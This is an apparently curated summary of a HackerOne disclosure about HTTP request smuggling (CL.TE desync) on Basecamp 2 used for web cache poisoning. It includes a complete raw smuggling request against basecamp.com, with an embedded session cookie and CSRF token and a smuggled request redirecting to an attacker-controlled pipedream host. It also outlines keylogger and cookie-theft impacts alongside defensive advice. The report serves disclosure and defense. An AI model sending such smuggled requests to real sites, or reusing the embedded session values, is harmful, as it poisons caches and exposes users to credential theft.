# HTTP Request Smuggling on Basecamp 2 Enables Web Cache Poisoning

## Metadata
- **Source:** HackerOne
- **Report:** 919175 | https://hackerone.com/reports/919175
- **Submitted:** 2020-07-08
- **Reporter:** hazimaslam
- **Program:** Basecamp
- **Bounty:** Not specified in report
- **Severity:** critical
- **Vuln:** HTTP Request Smuggling, Web Cache Poisoning, CL.TE (Content-Length/Transfer-Encoding) Desynchronization
- **CVEs:** None
- **Category:** uncategorised

## Summary
An authenticated attacker can exploit HTTP request smuggling via conflicting Content-Length and Transfer-Encoding headers to desynchronize front-end and backend servers on Basecamp 2. By injecting a malicious request with a spoofed X-Forwarded-Host header, the attacker can poison the web cache with an off-site redirect, affecting all subsequent users who request the affected URL.

## Attack scenario
1. Attacker authenticates to Basecamp 2 with valid credentials
2. Attacker crafts a smuggled HTTP request using CL.TE desynchronization (Content-Length: 144 with Transfer-Encoding: chunked and Transfer-encoding: identity headers)
3. First request is processed by frontend (Content-Length), leaving smuggled GET request in backend socket buffer
4. Attacker's smuggled request executes on backend with X-Forwarded-Host header pointing to attacker-controlled domain (enjv2g5042bg.x.pipedream.net)
5. Backend generates redirect response to malicious domain, which frontend caches
6. Subsequent legitimate users requesting same URL receive poisoned cached response redirecting them to attacker domain

## Root cause
Basecamp's front-end and back-end servers interpret conflicting HTTP headers (Content-Length vs Transfer-Encoding) differently, causing request boundary misalignment. Combined with inadequate cache validation of X-Forwarded-Host headers, this allows injection of persistent malicious content into the cache layer.

## Attacker mindset
Exploit infrastructure misconfigurations to achieve persistent, large-scale attacks without repeated interaction. Leverage trusted redirect mechanisms and caching infrastructure to distribute malicious payloads to unsuspecting users at scale, enabling credential theft or malware distribution.

## Defensive takeaways
- Implement strict HTTP/1.1 RFC 7230 compliance: reject requests with conflicting Content-Length and Transfer-Encoding headers
- Normalize all Transfer-Encoding header values and handle only well-defined chunked encoding
- Validate and sanitize X-Forwarded-Host and similar proxy headers against whitelist of legitimate hosts
- Implement cache-key normalization to prevent header-based cache poisoning
- Use connection-level request boundaries; avoid request smuggling by properly validating Content-Length before parsing request body
- Implement robust cache invalidation for redirect responses based on origin validation
- Conduct regular HTTP desynchronization testing between load balancers and application servers

## Variant hunting
Search for similar CL.TE/TE.CL desynchronization vulnerabilities in other Ruby on Rails applications using reverse proxy infrastructure (nginx, HAProxy). Test for cache poisoning via X-Forwarded-* headers on e-commerce and SaaS platforms with multi-tier architectures. Look for applications accepting multiple Transfer-Encoding header definitions.

## MITRE ATT&CK
- T1190
- T1557
- T1110
- T1040

## Notes
Report demonstrates clear proof-of-concept with concrete RequestBin capture. Attack requires initial authentication but enables unauthenticated impact to other users. Severity elevated due to web cache poisoning making attack persistent and affecting arbitrary users. Similar to Portswigger's research on HTTP request smuggling (CL.TE vulnerabilities).

## Full report
<details><summary>Expand</summary>

It is found that an authenticated Basecamp 2 user can desync front and backend servers and poison the socket with harmful response for the next visitor.  During redirect probe, It also appears that front-end infrastructure performs caching of content. Using HTTP request smuggling attack, It is possible to poison the cache with the off-site redirect response using `X-Forwarded-Host` request header in smuggled request. This will make the attack persistent, affecting any user who subsequently requests the affected URL.

## Validation steps
**1.**  Open https://requestbin.com/r/enjv2g5042bg in your browser for request capturing.

**2.** Paste the following request in Burp repeater (I've embedded my session in the request for your ease):

```http
POST /4618984/account HTTP/1.1
Host: basecamp.com
Connection: keep-alive
Content-Length: 144
Accept: */*
X-CSRF-Token: BW5Kp3r1hLOuZI6+4GkBW5XUpkt55bi9tIiqgKFo1ZY=
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Cookie: _basecamp_session=BAh7CEkiD3Nlc3Npb25faWQGOgZFVEkiJTAwNzU0OTI3NWZjMTI0Zjk5ZTVlOGE5NTU0MGFhN2UyBjsAVEkiEF9jc3JmX3Rva2VuBjsARkkiMUJXNUtwM3IxaExPdVpJNis0R2tCVzVYVXBrdDU1Ymk5dElpcWdLRm8xWlk9BjsARkkiDnBlcnNvbl9pZAY7AEZpBHYSEQE%3D--ced0e607b9844aff72e0b9421e73e4d52c8b04bc;identity_id=BAhpBOwxQgE%3D--3a11dbd3096b61294dc6c864b807a87944e4b6ab;
Transfer-Encoding: chunked
Transfer-encoding: identity

22
_method=patch&account%5Bname%5D=BC
0

GET /x HTTP/1.1
X-Forwarded-Host: enjv2g5042bg.x.pipedream.net
X-Forwarded-Proto: http
Foo: bar
```
Make sure to set the target to `https://basecamp.com` and port to `443`.

**3.** Issue the request in repeater.

**4.** Observe the captured request in RequestBin.com

## Impact

- With request smuggling, attacker can serve harmful response to random people actively browsing the website, enabling straightforward mass-exploitation.

- By redirecting javascript imports to a malicious domain, an attacker can inject a key-logger and steal user passwords from login page.

- It is also possible to capture visitors' request headers and cookies.

</details>

---
*Analysed by Claude on 2026-05-24*
